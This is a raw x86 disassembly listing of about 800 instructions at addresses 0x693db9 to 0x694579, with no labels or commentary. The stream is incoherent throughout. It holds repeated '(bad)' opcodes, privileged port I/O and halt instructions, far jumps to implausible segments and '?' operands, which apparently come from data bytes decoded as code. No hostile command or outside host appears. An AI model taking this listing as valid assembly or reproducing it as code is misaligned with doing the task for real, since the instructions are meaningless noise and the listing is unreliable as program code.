  693db9:	rcl    dh,0x81
  693dbc:	lods   al,BYTE PTR ds:[esi]
  693dbd:	scas   al,BYTE PTR es:[edi]
  693dbe:	das    
  693dbf:	xor    esi,DWORD PTR cs:[edi+0x28]
  693dc3:	pop    ecx
  693dc4:	and    ebp,DWORD PTR ds:0x86a9c440
  693dca:	nop
  693dcb:	out    0xf,eax
  693dcd:	fsqrt  
  693dcf:	iret   
  693dd0:	jae    0x693dfe
  693dd2:	(bad)  
  693dd4:	rcr    BYTE PTR [ebp+0x55],1
  693dd7:	push   cs
  693dd8:	mov    bl,0x1b
  693dda:	and    al,0xd1
  693ddc:	outs   dx,BYTE PTR ds:[esi]
  693ddd:	mov    BYTE PTR [edx+0x10],al
  693de0:	push   ecx
  693de1:	mul    DWORD PTR [ebx+0x37b337bd]
  693de7:	pop    ebp
  693de8:	push   ds
  693de9:	fnstsw WORD PTR [edi+ebp*1+0x53843a6f]
  693df0:	dec    esi
  693df1:	and    DWORD PTR [edi+ebp*8-0x3c55738],ecx
  693df8:	imul   ecx,DWORD PTR [ebx-0x10be3597],0xb25ab914
  693e02:	lock jbe 0x693e45
  693e05:	iret   
  693e06:	out    0xb4,al
  693e08:	fimul  DWORD PTR [ebx-0x7868c9ed]
  693e0e:	xor    al,0x43
  693e10:	mov    DWORD PTR [esi],eax
  693e12:	push   eax
  693e13:	mov    gs,WORD PTR [ecx]
  693e15:	dec    eax
  693e16:	cmp    esi,ebx
  693e18:	pop    eax
  693e19:	pop    es
  693e1a:	jl     0x693de2
  693e1c:	add    BYTE PTR [ebx+0x2fe8168d],dl
  693e22:	push   0x1e
  693e24:	sbb    dh,bh
  693e26:	std    
  693e27:	hlt    
  693e28:	clc    
  693e29:	jb     0x693e70
  693e2b:	lods   al,BYTE PTR ds:[esi]
  693e2c:	call   0x66574f8b
  693e31:	pop    es
  693e32:	fsubr  st,st(0)
  693e34:	in     eax,dx
  693e35:	jg     0x693e80
  693e37:	loope  0x693e06
  693e39:	pop    ebx
  693e3a:	addr16 dec eax
  693e3c:	mov    edi,0x68ec26f
  693e41:	inc    ebx
  693e42:	sub    ch,BYTE PTR [esi+0x79add5c5]
  693e48:	arpl   WORD PTR [ebx-0x527e7a8f],bx
  693e4e:	cld    
  693e4f:	or     cl,BYTE PTR [eax+0x4f21eaf2]
  693e55:	jmp    0x693e72
  693e57:	outs   dx,BYTE PTR ds:[esi]
  693e58:	mov    al,0x16
  693e5a:	(bad)  
  693e5b:	cmp    esi,edi
  693e5d:	pop    ebx
  693e5e:	mov    ebp,0x36e34f7e
  693e63:	js     0x693ed6
  693e65:	jne    0x693e92
  693e67:	into   
  693e68:	ins    DWORD PTR es:[edi],dx
  693e69:	xor    DWORD PTR [eax+eiz*4+0x4867ccbf],ebx
  693e70:	jmp    0x221d2b37
  693e75:	test   al,0xd0
  693e77:	call   FWORD PTR [edx]
  693e79:	mov    bh,0x63
  693e7b:	and    DWORD PTR ds:0x538f6fec,edx
  693e81:	push   ebx
  693e82:	sar    BYTE PTR [esi+eax*4+0x68],cl
  693e86:	xchg   esp,eax
  693e87:	jnp    0x693e26
  693e89:	arpl   WORD PTR [eax+ecx*1+0x16ea056e],cx
  693e90:	adc    dl,BYTE PTR [ebx+0x69]
  693e93:	cmp    DWORD PTR [ecx+0x31],eax
  693e96:	nop
  693e97:	fwait
  693e98:	mov    esi,0xd001f935
  693e9d:	test   DWORD PTR [edx+0x66],esi
  693ea0:	cmp    al,0x17
  693ea2:	mov    edx,0x751a4d01
  693ea7:	scas   al,BYTE PTR es:[edi]
  693ea8:	sub    DWORD PTR [edi],esp
  693eaa:	jl     0x693e8b
  693eac:	jno    0x693e87
  693eae:	inc    edx
  693eaf:	or     DWORD PTR [ebx-0x7e],ecx
  693eb2:	rcl    DWORD PTR [edx+0x1a],cl
  693eb5:	jmp    0x65e2:0x31eeca94
  693ebc:	mov    bh,0x1
  693ebe:	push   cs
  693ebf:	in     eax,dx
  693ec0:	js     0x693f2f
  693ec2:	jp     0x693ea8
  693ec4:	cmp    eax,0x37f85b7c
  693ec9:	mul    DWORD PTR [esi-0x7db8e7d1]
  693ecf:	stc    
  693ed0:	pop    eax
  693ed1:	adc    eax,0x6eda8896
  693ed6:	sbb    eax,ecx
  693ed8:	mov    bh,bh
  693eda:	pop    ebp
  693edb:	cwde   
  693edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693edd:	mov    dh,bh
  693edf:	shr    ebp,cl
  693ee1:	fwait
  693ee2:	jle    0x693ef1
  693ee4:	xchg   ebx,eax
  693ee5:	bound  edx,QWORD PTR [eax-0x49]
  693ee8:	scas   eax,DWORD PTR es:[edi]
  693ee9:	and    eax,DWORD PTR [edi+0x4f]
  693eec:	jl     0x693f49
  693eee:	pop    ss
  693eef:	jecxz  0x693f22
  693ef1:	jge    0x693e85
  693ef3:	and    cl,cl
  693ef5:	je     0x693f1f
  693ef7:	in     al,0x2
  693ef9:	ds pushf 
  693efb:	or     ah,BYTE PTR [ebx+ecx*8]
  693efe:	into   
  693eff:	repnz mov ds:0x1218b0c0,eax
  693f05:	lods   al,BYTE PTR ds:[esi]
  693f06:	fsub   QWORD PTR [edx-0x598bfd2c]
  693f0c:	fbld   TBYTE PTR [edx+0x29]
  693f0f:	pop    esi
  693f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  693f11:	xchg   esp,eax
  693f12:	jl     0x693f55
  693f14:	(bad)  
  693f15:	push   ebx
  693f16:	jns    0x693f49
  693f18:	js     0x693e9e
  693f1a:	lds    edx,FWORD PTR ds:0x4e50c2cb
  693f20:	lds    eax,FWORD PTR [esi]
  693f22:	mov    cl,0xb3
  693f24:	nop
  693f25:	sbb    BYTE PTR [eax+0x6c70dbf3],0xfe
  693f2c:	sub    edx,ecx
  693f2e:	mov    ebx,0x75189e82
  693f33:	fld    TBYTE PTR [edi+0x58]
  693f36:	in     eax,0xc1
  693f38:	or     DWORD PTR [esi+0x4d4f55a4],edi
  693f3e:	ins    DWORD PTR es:[edi],dx
  693f3f:	scas   eax,DWORD PTR es:[edi]
  693f40:	fiadd  DWORD PTR [ecx+ebx*1-0x4a]
  693f44:	inc    eax
  693f45:	retf   0x5cb4
  693f48:	pop    edx
  693f49:	outs   dx,BYTE PTR ds:[esi]
  693f4a:	xchg   ebp,eax
  693f4b:	inc    ebp
  693f4c:	les    esi,FWORD PTR [ebp+0x5c]
  693f4f:	or     DWORD PTR [eax+0x568bb1d9],ebx
  693f55:	xchg   edx,eax
  693f56:	add    DWORD PTR [eax],0xffffffb3
  693f59:	test   BYTE PTR [edi],0x76
  693f5c:	je     0x693eed
  693f5e:	push   ebp
  693f5f:	ret    
  693f60:	je     0x693f29
  693f62:	arpl   WORD PTR es:0xd582de37,sp
  693f69:	lods   al,BYTE PTR ds:[esi]
  693f6a:	test   al,0xc9
  693f6c:	add    esi,DWORD PTR [esi-0x24987d15]
  693f72:	mov    ds:0x6d6915c9,al
  693f77:	in     al,0x77
  693f79:	mov    bl,0xfb
  693f7b:	xchg   ebp,eax
  693f7c:	fiadd  WORD PTR [edx-0x1]
  693f7f:	repnz inc edx
  693f81:	jne    0x693f76
  693f83:	retf   
  693f84:	inc    eax
  693f85:	rol    dh,1
  693f87:	mov    bl,0x77
  693f89:	mov    ds:0xd48d59bf,al
  693f8e:	add    eax,0x7ed2abb
  693f93:	enter  0x5b86,0xfc
  693f97:	popa   
  693f98:	pushf  
  693f99:	das    
  693f9a:	xlat   BYTE PTR ds:[ebx]
  693f9b:	add    DWORD PTR [ecx],esi
  693f9d:	bound  ecx,QWORD PTR [eax]
  693f9f:	leave  
  693fa0:	test   al,0x51
  693fa2:	fs or  al,0xbe
  693fa5:	in     al,0x32
  693fa7:	or     ch,bl
  693fa9:	shl    eax,0xc4
  693fac:	jmp    0x2c92:0xa658a912
  693fb3:	add    eax,DWORD PTR [edx+0x46a719c7]
  693fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  693fba:	popf   
  693fbb:	mov    al,0x68
  693fbd:	mov    ds:0x375b822f,al
  693fc2:	xchg   edi,eax
  693fc3:	push   ebp
  693fc4:	data16 cmp BYTE PTR [ebx+eax*8+0x494ebd8e],al
  693fcc:	and    DWORD PTR [esi+edi*4],ecx
  693fcf:	lahf   
  693fd0:	loop   0x693fc0
  693fd2:	fistp  WORD PTR [esi-0x2e]
  693fd5:	stos   DWORD PTR es:[edi],eax
  693fd6:	pop    ds
  693fd7:	bound  ebx,QWORD PTR [ebx+0x30]
  693fda:	pop    edi
  693fdb:	ror    BYTE PTR [eax-0x1e405aab],cl
  693fe1:	push   edi
  693fe2:	iret   
  693fe3:	xlat   BYTE PTR ds:[ebx]
  693fe4:	mov    ebp,?
  693fe6:	loopne 0x694039
  693fe8:	push   cs
  693fe9:	push   esp
  693fea:	stc    
  693feb:	aaa    
  693fec:	xor    ebp,DWORD PTR [ebx-0x2a3b5d6a]
  693ff2:	jmp    0x6fa:0x9885d438
  693ff9:	in     eax,0x6e
  693ffb:	mov    cl,0xb9
  693ffd:	retf   
  693ffe:	ret    0x7d3d
  694001:	pusha  
  694002:	(bad)
  694005:	adc    bh,BYTE PTR [ecx+0x65]
  694008:	mov    esi,0xa92115e8
  69400d:	call   0x764782cb
  694012:	ret    
  694013:	cmp    al,0x90
  694015:	mov    dl,0x3d
  694017:	inc    ebp
  694018:	mov    ebx,DWORD PTR [ecx+0x2f]
  69401b:	jns    0x694073
  69401d:	test   BYTE PTR [esi-0x1434b455],0x74
  694024:	test   DWORD PTR [edi],0xfed98ff
  69402a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69402b:	mov    eax,0xb1b17a40
  694030:	xor    BYTE PTR [ebx+0x6f],dl
  694033:	repz or edi,ecx
  694036:	mov    bl,0x9e
  694038:	dec    eax
  694039:	jns    0x69400a
  69403b:	pushf  
  69403c:	retw   0x4b31
  694040:	mov    al,0xc
  694042:	lock jns 0x694036
  694045:	hlt    
  694046:	lds    ebp,FWORD PTR [eax-0x18d25470]
  69404c:	cmp    cl,al
  69404e:	inc    ebx
  69404f:	sub    BYTE PTR [esi+0x6f],dl
  694052:	sub    DWORD PTR [edi],edi
  694054:	aas    
  694055:	in     al,0x42
  694057:	adc    dh,BYTE PTR [eax-0x5fa658cc]
  69405d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69405e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69405f:	add    BYTE PTR [esi+edx*8+0x3a],cl
  694063:	(bad)  
  694064:	rcl    DWORD PTR [ecx+0x482c820a],1
  69406a:	fstp   TBYTE PTR [esi]
  69406c:	xor    al,0x94
  69406e:	enter  0x69eb,0x14
  694072:	mov    edi,0xd76006b5
  694077:	pop    eax
  694078:	mov    ?,ecx
  69407a:	adc    DWORD PTR [edx+0x20],ebx
  69407d:	cld    
  69407e:	mov    eax,0x61241588
  694083:	push   eax
  694084:	jmp    0x94d37c3f
  694089:	fwait
  69408a:	xlat   BYTE PTR ds:[ebx]
  69408b:	retf   
  69408c:	xchg   esi,eax
  69408d:	out    dx,eax
  69408e:	add    eax,0x127ad0d8
  694093:	inc    edx
  694094:	cmp    al,0xdf
  694096:	inc    esp
  694097:	sbb    edx,DWORD PTR [ebp-0x778d2f1f]
  69409d:	inc    esp
  69409e:	popf   
  69409f:	dec    bp
  6940a1:	add    esp,DWORD PTR [ebp-0x46]
  6940a4:	xor    al,0xd1
  6940a6:	mov    ecx,0x9e896a47
  6940ab:	call   0x1aa9:0xe7c7884e
  6940b2:	mov    esi,ds
  6940b4:	pop    ebp
  6940b5:	cwde   
  6940b6:	aad    0xe7
  6940b8:	enter  0x4b94,0xb7
  6940bc:	rcl    DWORD PTR [edi],0xdb
  6940bf:	mov    bh,0x2c
  6940c1:	xchg   esp,eax
  6940c2:	adc    edi,DWORD PTR [ecx]
  6940c4:	mov    ah,0xe
  6940c6:	rcr    DWORD PTR [ebx],1
  6940c8:	pushf  
  6940c9:	pop    ecx
  6940ca:	stos   BYTE PTR es:[edi],al
  6940cb:	stc    
  6940cc:	mov    bl,0xba
  6940ce:	popf   
  6940cf:	leave  
  6940d0:	sbb    DWORD PTR [edx+0x1e758e07],ebp
  6940d6:	cmp    bh,BYTE PTR [esi-0x1a]
  6940d9:	add    eax,DWORD PTR [eax]
  6940db:	and    eax,0xf61f031f
  6940e0:	clc    
  6940e1:	cs jmp 0xedc92563
  6940e7:	fucom  st(6)
  6940e9:	addr16 in al,0x5a
  6940ec:	add    BYTE PTR fs:[eax-0x376d5f51],bh
  6940f3:	lods   al,BYTE PTR ds:[esi]
  6940f4:	js     0x6940f0
  6940f6:	mov    esi,DWORD PTR [edx+0x48]
  6940f9:	sbb    eax,0xadf752c6
  6940fe:	sti    
  6940ff:	aad    0xfd
  694101:	mov    esp,0x8369f4a9
  694106:	idiv   DWORD PTR [esi+0xb301957]
  69410c:	cmp    BYTE PTR [eax+0x50],0x88
  694110:	mov    esp,0x182c148
  694115:	std    
  694116:	cmc    
  694117:	mov    ecx,0x795363cc
  69411c:	cmp    DWORD PTR [edx+0x7e],ebx
  69411f:	push   ebp
  694120:	xchg   edx,eax
  694121:	mov    esp,0x21a33b4
  694126:	ja     0x694130
  694128:	xor    DWORD PTR [ecx-0x48],ecx
  69412b:	data16 jge 0x69419d
  69412e:	sbb    BYTE PTR [ebx+0x2f],ah
  694131:	xchg   BYTE PTR [ebx+0x759c18ad],ah
  694137:	inc    edx
  694138:	loope  0x69410e
  69413a:	fmulp  st(5),st
  69413c:	out    0x0,eax
  69413e:	sti    
  69413f:	add    eax,DWORD PTR ds:[ebx-0x27251dc0]
  694146:	nop
  694147:	test   eax,0x4ecfb19c
  69414c:	rcr    BYTE PTR [ecx+0x1e91d336],0x98
  694153:	and    bh,BYTE PTR [edi-0x6625cd6e]
  694159:	cli    
  69415a:	cwde   
  69415b:	and    BYTE PTR [ecx+0x6a3fecd3],bh
  694161:	loop   0x69417a
  694163:	push   edx
  694164:	adc    al,0xbe
  694166:	adc    al,0xd2
  694168:	pop    edx
  694169:	clc    
  69416a:	jl     0x694134
  69416c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69416d:	adc    ch,0x3b
  694170:	cld    
  694171:	push   esp
  694172:	hlt    
  694173:	ss jne 0x6941c1
  694176:	jl     0x694145
  694178:	(bad)  
  694179:	test   eax,0xa524d9b4
  69417e:	inc    esi
  69417f:	mov    esi,0xede8419a
  694184:	inc    ecx
  694185:	ds sar bh,1
  694188:	pop    ss
  694189:	sub    al,0xd0
  69418b:	popf   
  69418c:	je     0x69412d
  69418e:	mov    DWORD PTR [eax-0x62e8ad90],esp
  694194:	and    eax,0xc3db733a
  694199:	lods   al,BYTE PTR ds:[esi]
  69419a:	pop    esi
  69419b:	cdq    
  69419c:	sub    al,0x16
  69419e:	test   ebp,esp
  6941a0:	mov    ah,0xe
  6941a2:	lock popa 
  6941a4:	in     eax,dx
  6941a5:	cld    
  6941a6:	or     DWORD PTR [ebp+0x499df09a],edx
  6941ac:	(bad)  
  6941ad:	jo     0x694149
  6941af:	pop    esp
  6941b0:	mov    edi,0xb3215d99
  6941b5:	fst    DWORD PTR gs:[ebp-0x6f]
  6941b9:	scas   al,BYTE PTR es:[edi]
  6941ba:	ja     0x694192
  6941bc:	jb     0x6941e0
  6941be:	sub    BYTE PTR [edi],dl
  6941c0:	push   ebx
  6941c1:	rcl    esi,0x7e
  6941c4:	scas   al,BYTE PTR es:[edi]
  6941c5:	pop    esi
  6941c6:	inc    edi
  6941c7:	and    DWORD PTR [ebp-0x4e],esi
  6941ca:	push   0xffffffa3
  6941cc:	dec    edi
  6941cd:	mov    ecx,0xeb7a6864
  6941d2:	in     al,0x7c
  6941d4:	out    0xe2,al
  6941d6:	in     eax,0x53
  6941d8:	xchg   ebp,eax
  6941d9:	test   al,0xba
  6941db:	cmp    ecx,DWORD PTR [esi+0x49]
  6941de:	push   cs
  6941df:	(bad)  
  6941e0:	hlt    
  6941e1:	adc    eax,0xc4e2268d
  6941e6:	mov    eax,0xac44f209
  6941eb:	sbb    DWORD PTR [edx-0x6d25452d],esi
  6941f1:	sbb    al,0xc0
  6941f3:	adc    edi,ecx
  6941f5:	test   BYTE PTR [edx],0x5a
  6941f8:	in     eax,dx
  6941f9:	dec    ebp
  6941fa:	not    DWORD PTR [edx-0x35046663]
  694200:	inc    ecx
  694201:	cmp    ebp,edi
  694203:	aam    0x87
  694205:	mov    ecx,DWORD PTR [ebp+0x5e]
  694208:	call   0x3088:0x7ddc35a9
  69420f:	ins    BYTE PTR es:[edi],dx
  694210:	jmp    0x9742:0xe6a8b49f
  694217:	(bad)  [ebx+0x16]
  69421a:	mov    eax,0x8a143016
  69421f:	mov    ch,0x1e
  694221:	jne    0x694241
  694223:	jnp    0x6941f4
  694225:	sub    al,0xc0
  694227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  694228:	aam    0xa4
  69422a:	jecxz  0x69421b
  69422c:	cli    
  69422d:	pop    es
  69422e:	call   0xab46781c
  694233:	xchg   esi,eax
  694234:	cmp    ah,ch
  694236:	sub    al,0x9f
  694238:	aam    0x1d
  69423a:	out    0xce,al
  69423c:	push   0x93d3f12f
  694241:	clc    
  694242:	cmc    
  694243:	inc    ecx
  694244:	push   ebx
  694245:	pop    ecx
  694246:	fdiv   QWORD PTR [edi-0x60]
  694249:	dec    edx
  69424a:	outs   dx,DWORD PTR ds:[esi]
  69424b:	cmp    DWORD PTR [edi-0x14],0x394e05fd
  694252:	jmp    0xc5c6:0xa5191e04
  694259:	push   0xa9f4d554
  69425e:	es or  al,0xff
  694261:	fsub   st,st(1)
  694263:	sub    edx,DWORD PTR [ecx-0x74860ab3]
  694269:	mov    eax,gs
  69426b:	xchg   ebp,eax
  69426c:	mov    al,0x7e
  69426e:	in     eax,0x48
  694270:	jbe    0x694201
  694272:	sbb    DWORD PTR [edi+0xb2bb48e],eax
  694278:	push   eax
  694279:	mov    ch,0x8f
  69427b:	lock push edx
  69427d:	dec    ebx
  69427e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69427f:	xor    al,0x15
  694281:	sbb    esp,DWORD PTR [ebx-0x653346b5]
  694287:	jge    0x69428a
  694289:	repnz dec ebx
  69428b:	jns    0x694252
  69428d:	and    al,0x7a
  69428f:	(bad)  
  694290:	push   esi
  694291:	add    ebp,ebp
  694293:	mov    ebx,edx
  694295:	mov    BYTE PTR [ebx-0x1d67d1fb],dh
  69429b:	or     DWORD PTR [ebx],edx
  69429d:	loop   0x69422e
  69429f:	shr    bh,1
  6942a1:	inc    ecx
  6942a2:	je     0x6942da
  6942a4:	mov    al,ds:0x68e7de55
  6942a9:	jnp    0x694288
  6942ab:	dec    edx
  6942ac:	in     al,dx
  6942ad:	cmp    edx,0xc493ef86
  6942b3:	loopne 0x694327
  6942b5:	int    0xab
  6942b7:	or     bh,BYTE PTR [edi]
  6942b9:	push   ss
  6942ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6942bb:	or     DWORD PTR [ecx+edx*4+0x26],esp
  6942bf:	mov    ebp,0xa0d9a1cd
  6942c4:	mov    al,0x6d
  6942c6:	inc    edx
  6942c7:	test   eax,0x8329a204
  6942cc:	xlat   BYTE PTR ds:[ebx]
  6942cd:	mov    ecx,0xd597ab2a
  6942d2:	in     eax,dx
  6942d3:	sbb    BYTE PTR [edi],ah
  6942d5:	mov    bh,0x81
  6942d7:	jmp    0x2012aa32
  6942dc:	out    0xed,al
  6942de:	repnz mov al,ds:0x34e0d5d6
  6942e4:	rol    BYTE PTR [ecx+edi*8],cl
  6942e7:	outs   dx,DWORD PTR ds:[esi]
  6942e8:	mov    ch,0x4f
  6942ea:	(bad)  [edx-0xb]
  6942ed:	sahf   
  6942ee:	mov    WORD PTR cs:[edi-0x68],?
  6942f2:	gs loope 0x694371
  6942f5:	imul   edx,DWORD PTR [edi],0xa4e668b4
  6942fb:	pop    edx
  6942fc:	jns    0x6942c5
  6942fe:	out    0xd5,eax
  694300:	xor    esi,DWORD PTR [esi-0x3a]
  694303:	mov    BYTE PTR [eax+0x54d384e8],0x31
  69430a:	fmul   DWORD PTR [eax+0x2f]
  69430d:	pop    ecx
  69430e:	adc    eax,0x55927068
  694313:	xchg   ebp,eax
  694314:	or     DWORD PTR [eax],0x79533420
  69431a:	iret   
  69431b:	adc    ch,BYTE PTR ds:0x6fe9571d
  694321:	cli    
  694322:	imul   ebp,DWORD PTR [ebp-0x5bd3a75d],0xf6f272dc
  69432c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69432d:	sub    al,0x2f
  69432f:	add    DWORD PTR [esi],edi
  694331:	scas   eax,DWORD PTR es:[edi]
  694332:	jo     0x6942e2
  694334:	sbb    BYTE PTR [edx+0x0],cl
  694337:	mov    cl,0x1d
  694339:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  69433b:	pusha  
  69433c:	aas    
  69433d:	shr    DWORD PTR [esi+ebp*8],cl
  694340:	outs   dx,BYTE PTR ds:[esi]
  694341:	out    dx,eax
  694342:	dec    ebx
  694343:	push   esp
  694344:	or     ecx,DWORD PTR ds:0x84b68fd3
  69434a:	test   DWORD PTR [ecx-0x293b6702],edx
  694350:	xor    edx,DWORD PTR [ebx]
  694352:	clc    
  694353:	out    dx,al
  694354:	in     al,0xe4
  694356:	pop    esp
  694357:	inc    esi
  694358:	neg    DWORD PTR es:[ebx+0x36bf0d97]
  69435f:	clc    
  694360:	(bad)
  694363:	dec    ecx
  694364:	mov    edi,0xc365dcc
  694369:	or     al,0x68
  69436b:	(bad)  
  69436c:	sub    ecx,DWORD PTR ds:0xe781d7c2
  694372:	cmp    edi,edx
  694374:	scas   al,BYTE PTR es:[edi]
  694375:	dec    DWORD PTR [edx]
  694377:	sbb    al,0x97
  694379:	xchg   DWORD PTR [ebx+0x68],ebp
  69437c:	addr16 adc ecx,ebp
  69437f:	retf   
  694380:	push   ss
  694381:	push   0xfffffff2
  694383:	and    DWORD PTR [ecx-0x7f42c043],0x7834243a
  69438d:	retf   0x18d5
  694390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  694391:	mul    DWORD PTR [ecx-0x4b]
  694394:	xchg   eax,ebx
  694396:	pop    ds
  694397:	pop    ecx
  694398:	std    
  694399:	fidivr WORD PTR [esi]
  69439b:	fs adc al,0xb0
  69439e:	xchg   ecx,eax
  69439f:	dec    edi
  6943a0:	xchg   edx,eax
  6943a1:	js     0x6943b1
  6943a3:	jecxz  0x69432b
  6943a5:	pop    ebx
  6943a6:	jne    0x6943d0
  6943a8:	mov    ebp,0x29ec940e
  6943ad:	dec    esp
  6943ae:	enter  0x464d,0x0
  6943b2:	sub    al,BYTE PTR [edx]
  6943b4:	retf   
  6943b5:	jo     0x6943e4
  6943b7:	jnp    0x694394
  6943b9:	and    eax,0x285ad4d9
  6943be:	mov    ah,0x93
  6943c0:	add    bl,dh
  6943c2:	mov    bh,0x98
  6943c4:	test   BYTE PTR [esi],dl
  6943c6:	or     al,0x67
  6943c8:	data16 or ah,bh
  6943cb:	pop    ecx
  6943cc:	shl    esi,1
  6943ce:	xor    ecx,edx
  6943d0:	add    edx,DWORD PTR [ebx+0x19c4c8a8]
  6943d6:	clc    
  6943d7:	stos   DWORD PTR es:[edi],eax
  6943d8:	outs   dx,BYTE PTR ds:[esi]
  6943d9:	cld    
  6943da:	imul   ebx,DWORD PTR [ecx],0xffffffee
  6943dd:	cmp    DWORD PTR [esi+0x4],eax
  6943e0:	test   eax,0x334151fb
  6943e5:	sub    ecx,DWORD PTR [ebx+esi*2-0x5af0d4eb]
  6943ec:	push   ds
  6943ed:	mov    al,ds:0xaf823c41
  6943f2:	out    0x71,eax
  6943f4:	sbb    BYTE PTR [ecx-0x1c],ah
  6943f7:	mov    eax,0xb5497d43
  6943fc:	push   ds
  6943fd:	int3   
  6943fe:	pop    esi
  6943ff:	pop    esi
  694400:	aad    0xdc
  694402:	cwde   
  694403:	dec    edi
  694404:	test   DWORD PTR [esi+0x41],0x417585a2
  69440b:	xchg   edx,eax
  69440c:	xor    esi,esi
  69440e:	sbb    BYTE PTR [edi*1-0x7794dc57],ah
  694415:	sbb    al,0x1b
  694417:	inc    ecx
  694418:	aas    
  694419:	arpl   WORD PTR [edx+0x774b7865],si
  69441f:	inc    ecx
  694420:	jge    0x6943a2
  694422:	push   cs
  694423:	ficom  WORD PTR [esi-0xc2ca632]
  694429:	xchg   edi,eax
  69442a:	mov    al,ds:0x9396085f
  69442f:	pop    ecx
  694430:	int3   
  694431:	adc    eax,DWORD PTR [ebx]
  694433:	ret    
  694434:	jmp    0x176a88f6
  694439:	mov    ds:0xb14b210b,al
  69443e:	mov    ch,0x9f
  694440:	retf   
  694441:	ror    DWORD PTR [edi-0x238abffe],cl
  694447:	aaa    
  694448:	mov    esp,DWORD PTR [ebp+edi*2+0x65bbe2b4]
  69444f:	pop    esi
  694450:	cmp    al,0xe4
  694452:	mov    eax,0xb79b7c4a
  694457:	outs   dx,BYTE PTR ds:[esi]
  694458:	jnp    0x694462
  69445a:	push   ecx
  69445b:	dec    esp
  69445c:	(bad)  
  69445d:	leave  
  69445e:	push   esp
  69445f:	push   es
  694460:	aaa    
  694461:	adc    esi,edx
  694463:	xchg   esp,eax
  694464:	arpl   WORD PTR [ebx+0x5c],bp
  694467:	inc    ebp
  694468:	pop    ecx
  694469:	ret    
  69446a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69446b:	out    dx,al
  69446c:	cld    
  69446d:	mov    ebp,DWORD PTR [eax+eiz*1+0x79b74ac4]
  694474:	inc    ebx
  694475:	add    BYTE PTR fs:[ebx],dh
  694478:	mov    ebp,DWORD PTR [esi-0x3e1246cf]
  69447e:	dec    ebp
  69447f:	mov    ebx,0x7ebc0384
  694484:	and    al,0x8e
  694486:	pop    esp
  694487:	mov    gs,WORD PTR [esi]
  694489:	mov    dl,0xa9
  69448b:	lahf   
  69448c:	or     al,0x4c
  69448e:	mov    bl,0x46
  694490:	inc    esi
  694491:	test   BYTE PTR [ecx+edi*2+0x78ff4da1],ch
  694498:	fbstp  TBYTE PTR [ebp-0x53]
  69449b:	loop   0x694434
  69449d:	test   eax,0x2161325e
  6944a2:	pop    ss
  6944a3:	mov    ch,0x21
  6944a5:	dec    esi
  6944a6:	stos   DWORD PTR es:[edi],eax
  6944a7:	add    eax,DWORD PTR [ebx-0x5069dc5b]
  6944ad:	lods   eax,DWORD PTR ds:[esi]
  6944ae:	js     0x6944f8
  6944b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6944b1:	fild   WORD PTR [ecx+0x33604af7]
  6944b7:	pop    ebp
  6944b8:	data16 adc BYTE PTR ds:[ebx-0x64798292],ch
  6944c0:	dec    ecx
  6944c1:	int    0x94
  6944c3:	pop    edi
  6944c4:	pushf  
  6944c5:	sti    
  6944c6:	sbb    dh,cl
  6944c8:	adc    eax,0xf42b5bf6
  6944cd:	out    0x4f,al
  6944cf:	addr16 aad 0xd5
  6944d2:	and    ebx,0x4
  6944d5:	test   DWORD PTR [ebp-0x3e],esi
  6944d8:	and    eax,0x54a00c3d
  6944dd:	cmp    BYTE PTR [ebp+ecx*8+0x51],0xc7
  6944e2:	adc    DWORD PTR [ebx-0x17],esp
  6944e5:	icebp  
  6944e6:	and    eax,DWORD PTR ds:0x64a0dfcd
  6944ec:	icebp  
  6944ed:	data16 test al,0xbb
  6944f0:	pop    ebx
  6944f1:	xchg   edx,eax
  6944f2:	mov    dl,0x4c
  6944f4:	std    
  6944f5:	mov    ebx,0x2edd0f7e
  6944fa:	nop
  6944fb:	in     eax,dx
  6944fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6944fd:	int3   
  6944fe:	sbb    cl,dh
  694500:	retf   0xc416
  694503:	cmp    al,0xab
  694505:	cs out 0x84,al
  694508:	inc    esp
  694509:	add    BYTE PTR [esi+0x30],bl
  69450c:	hlt    
  69450d:	lock into 
  69450f:	fwait
  694510:	imul   ebp,edx,0xffffffeb
  694513:	std    
  694514:	mov    BYTE PTR [eax],dh
  694516:	and    eax,0x1a1e5d49
  69451b:	imul   esi,DWORD PTR [ebx],0xffffff86
  69451e:	popf   
  69451f:	adc    BYTE PTR [eax],ah
  694521:	fwait
  694522:	add    al,0x93
  694524:	and    dh,BYTE PTR [edx]
  694526:	je     0x694538
  694528:	sbb    al,0xc6
  69452a:	test   al,0xc5
  69452c:	gs mov eax,0x8677ba24
  694532:	leave  
  694533:	popa   
  694534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  694535:	hlt    
  694536:	dec    esi
  694537:	jmp    0x6944bc
  694539:	cli    
  69453a:	adc    BYTE PTR [edi+0x1b],bh
  69453d:	repnz loopne 0x694529
  694540:	lods   al,BYTE PTR ds:[si]
  694542:	mov    ebp,0xd3015ee7
  694547:	xor    eax,0x2f026e00
  69454c:	sub    DWORD PTR [ecx+0x7c16bcd8],esi
  694552:	pop    ecx
  694553:	mov    bh,0x48
  694555:	dec    edi
  694556:	jmp    0xe7fa71e8
  69455b:	sub    BYTE PTR [edi],bh
  69455d:	add    al,0x44
  69455f:	stos   DWORD PTR es:[edi],eax
  694560:	sahf   
  694561:	sbb    al,0x9d
  694563:	sbb    eax,0x37d2ec9e
  694568:	jmp    0x694528
  69456a:	repnz dec edx
  69456c:	xchg   esp,eax
  69456d:	(bad)  
  69456e:	mov    ch,0x13
  694570:	fs (bad) 
  694572:	pop    ebp
  694573:	fs xor al,0x76
  694576:	xchg   edi,eax
  694577:	fsub   DWORD PTR [ebx]
  694579:	jp     0x69450c
